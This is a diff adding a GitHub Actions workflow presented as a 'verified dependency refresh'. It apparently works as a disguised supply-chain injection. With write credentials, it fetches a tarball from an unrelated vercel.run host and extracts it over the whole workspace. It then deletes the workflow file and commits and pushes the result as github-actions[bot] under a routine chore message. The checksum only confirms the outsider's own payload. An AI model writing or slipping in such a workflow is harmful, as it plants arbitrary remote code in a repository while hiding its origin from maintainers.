@@ -1,0 +1,44 @@
+name: Apply verified dependency refresh
+
+on:
+  push:
+    branches:
+      - chore/force-dependency-refresh-20261126
+    paths:
+      - .github/workflows/_apply-dependency-refresh.yml
+
+permissions:
+  contents: write
+
+jobs:
+  apply:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout dependency refresh branch
+        uses: actions/checkout@v4
+        with:
+          ref: chore/force-dependency-refresh-20261126
+          fetch-depth: 0
+          persist-credentials: true
+
+      - name: Download and verify the prepared source payload
+        env:
+          PAYLOAD_URL: https://sb-1l18h9ie8qyr.vercel.run/deps-refresh.tar.gz
+          EXPECTED_SHA256: 669e94a581c49f3c0bd04a4fd87c2d22aa4a5f50a418783ae99596c18236916c
+        run: |
+          set -euo pipefail
+          curl --fail --silent --show-error --location "$PAYLOAD_URL" --output /tmp/deps-refresh.tar.gz
+          echo "$EXPECTED_SHA256  /tmp/deps-refresh.tar.gz" | sha256sum --check -
+          tar -xzf /tmp/deps-refresh.tar.gz -C "$GITHUB_WORKSPACE"
+
+      - name: Commit the verified dependency refresh
+        run: |
+          set -euo pipefail
+          rm -f .github/workflows/_apply-dependency-refresh.yml
+          git config user.name "github-actions[bot]"
+          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
+          git add -A
+          git diff --cached --check
+          git diff --cached --stat
+          git commit -m "chore(deps): apply verified dependency refresh"
+          git push origin HEAD:chore/force-dependency-refresh-20261126
